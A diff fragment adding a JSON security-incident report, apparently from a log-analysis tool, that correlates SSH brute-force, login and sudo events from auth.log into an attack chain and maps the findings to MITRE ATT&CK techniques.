+                "end_time": "2026-10-06T22:16:14+00:00",
+                "source_ips": [
+                    "192.0.2.50"
+                ],
+                "usernames": [
+                    "admin",
+                    "root"
+                ],
+                "steps": [
+                    {
+                        "step_id": "CHAIN-0011-STEP-01",
+                        "stage": "INITIAL_ACCESS",
+                        "title": "SSH Brute-Force Activity Detected",
+                        "description": "4 failed SSH authentication attempts were detected from 192.0.2.50 against user admin within 300 seconds.",
+                        "timestamp": "2026-10-06T22:14:03+00:00",
+                        "severity": "HIGH",
+                        "event_ids": [
+                            "AUTH-00001",
+                            "AUTH-00002",
+                            "AUTH-00003",
+                            "AUTH-00004"
+                        ],
+                        "finding_ids": [
+                            "BRUTE-FORCE-0001"
+                        ],
+                        "indicators": [],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "SSH_BRUTE_FORCE",
+                            "source": null,
+                            "evidence_sources": [
+                                "auth.log"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0011-STEP-02",
+                        "stage": "INITIAL_ACCESS",
+                        "title": "Successful SSH Login After Brute-Force Activity",
+                        "description": "4 failed SSH authentication attempts from 192.0.2.50 against user admin were followed by a successful SSH authentication.",
+                        "timestamp": "2026-10-06T22:14:03+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "AUTH-00001",
+                            "AUTH-00002",
+                            "AUTH-00003",
+                            "AUTH-00004",
+                            "AUTH-00005",
+                            "AUTH-00006"
+                        ],
+                        "finding_ids": [
+                            "BRUTE-FORCE-SUCCESS-0001"
+                        ],
+                        "indicators": [],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "SSH_BRUTE_FORCE_SUCCESS",
+                            "source": null,
+                            "evidence_sources": [
+                                "auth.log"
+                            ]
+                        }
+                    },
+                    {
+                        "step_id": "CHAIN-0011-STEP-03",
+                        "stage": "PRIVILEGE_ESCALATION",
+                        "title": "Potential Privilege Escalation Detected",
+                        "description": "User admin executed a command through sudo as root. This represents a privilege transition that requires investigation.",
+                        "timestamp": "2026-10-06T22:16:14+00:00",
+                        "severity": "CRITICAL",
+                        "event_ids": [
+                            "AUTH-00007"
+                        ],
+                        "finding_ids": [
+                            "PRIV-ESC-0005"
+                        ],
+                        "indicators": [
+                            "sudo",
+                            "target_user=root"
+                        ],
+                        "metadata": {
+                            "category": null,
+                            "event_type": "PRIVILEGE_ESCALATION",
+                            "source": null,
+                            "evidence_sources": [
+                                "auth.log"
+                            ]
+                        }
+                    }
+                ],
+                "finding_ids": [
+                    "BRUTE-FORCE-0001",
+                    "BRUTE-FORCE-SUCCESS-0001",
+                    "PRIV-ESC-0005"
+                ],
+                "event_ids": [
+                    "AUTH-00001",
+                    "AUTH-00002",
+                    "AUTH-00003",
+                    "AUTH-00004",
+                    "AUTH-00005",
+                    "AUTH-00006",
+                    "AUTH-00007"
+                ],
+                "metadata": {
+                    "stages": [
+                        "INITIAL_ACCESS",
+                        "PRIVILEGE_ESCALATION"
+                    ],
+                    "finding_count": 3,
+                    "event_count": 7,
+                    "evidence_sources": [
+                        "auth.log"
+                    ],
+                    "cross_evidence": false,
+                    "correlation_window_seconds": 900,
+                    "correlation_signals": [
+                        {
+                            "type": "IDENTITY_CORRELATION",
+                            "reason": "Findings share one or more user identities.",
+                            "users": [
+                                "admin",
+                                "root"
+                            ],
+                            "confidence": 85
+                        },
+                        {
+                            "type": "SOURCE_CORRELATION",
+                            "reason": "Findings share one or more network source indicators.",
+                            "source_ips": [
+                                "192.0.2.50"
+                            ],
+                            "confidence": 90
+                        },
+                        {
+                            "type": "TEMPORAL_CORRELATION",
+                            "reason": "Related findings occurred within the investigation window.",
+                            "duration_seconds": 131.0,
+                            "confidence": 75
+                        }
+                    ]
+                }
+            }
+        ],
+        "mitre_techniques": [
+            {
+                "technique_id": "T1110.001",
+                "name": "Password Guessing",
+                "tactic": "Credential Access",
+                "description": "Repeated authentication attempts against an SSH account are consistent with password guessing.",
+                "finding_ids": [
+                    "BRUTE-FORCE-0001",
+                    "BRUTE-FORCE-SUCCESS-0001"
+                ],
+                "event_ids": [
+                    "AUTH-00001",
+                    "AUTH-00002",
+                    "AUTH-00003",
+                    "AUTH-00004",
+                    "AUTH-00005",
+                    "AUTH-00006"
+                ]
+            },
+            {
+                "technique_id": "T1548.003",
+                "name": "Sudo and Sudo Caching",
+                "tactic": "Privilege Escalation",
+                "description": "Sudo was used to execute a command with higher local privileges.",
+                "finding_ids": [
+                    "PRIV-ESC-0001",
+                    "PRIV-ESC-0002",
+                    "PRIV-ESC-0003",
+                    "PRIV-ESC-0004",
+                    "PRIV-ESC-0005"
+                ],
+                "event_ids": [
+                    "SUDO-00001",
+                    "SUDO-00002",
+                    "SUDO-00003",
+                    "SUDO-00004",
+                    "AUTH-00007"
+                ]
+            },
+            {
+                "technique_id": "T1003",
+                "name": "OS Credential Dumping",
+                "tactic": "Credential Access",
+                "description": "Credential-related system files or artifacts were accessed.",
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0001",
+                    "SUSPICIOUS-CMD-0002",
+                    "SUSPICIOUS-CMD-0006",
+                    "SUSPICIOUS-CMD-0007"
+                ],
+                "event_ids": [
+                    "BASH-00004",
+                    "BASH-00005",
+                    "BASH-00009",
+                    "SUDO-00002"
+                ]
+            },
+            {
+                "technique_id": "T1105",
+                "name": "Ingress Tool Transfer",
+                "tactic": "Command and Control",
+                "description": "Content was retrieved from a remote location.",
+                "finding_ids": [
+                    "SUSPICIOUS-CMD-0005"
+                ],
+                "event_ids": [
+                    "BASH-00008"
+                ]
+            },
+            {
+                "technique_id": "T1098.004",
+                "name": "SSH Authorized Keys",
+                "tactic": "Persistence",
+                "description": "SSH authorized keys were modified.",
+                "finding_ids": [
+                    "PERSISTENCE-0001"
+                ],
+                "event_ids": [
+                    "BASH-00009"
+                ]
+            },
+            {
+                "technique_id": "T1049",
+                "name": "System Network Connections Discovery",
+                "tactic": "Discovery",
+                "description": "Active network connections were enumerated.",
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0001"
+                ],
+                "event_ids": [
+                    "BASH-00006"
+                ]
+            },
+            {
+                "technique_id": "T1046",
+                "name": "Network Service Scanning",
+                "tactic": "Discovery",
+                "description": "Network services were enumerated.",
+                "finding_ids": [
+                    "NETWORK-ACTIVITY-0002"
+                ],
+                "event_ids": [
+                    "BASH-00007"
+                ]
+            }
+        ],
+        "attack_path": [
+            "Brute Force",
+            "Successful SSH Access",
+            "Privilege Escalation",
+            "Credential Access",
+            "Persistence"
+        ],
+        "source_ips": [
+            "192.0.2.50"
+        ],
+        "usernames": [
+            "admin",
+            "root"
+        ],
+        "finding_count": 17,
+        "chain_count": 11,
+        "highest_finding_severity": "CRITICAL",
+        "confidence": 100
+    }
+}
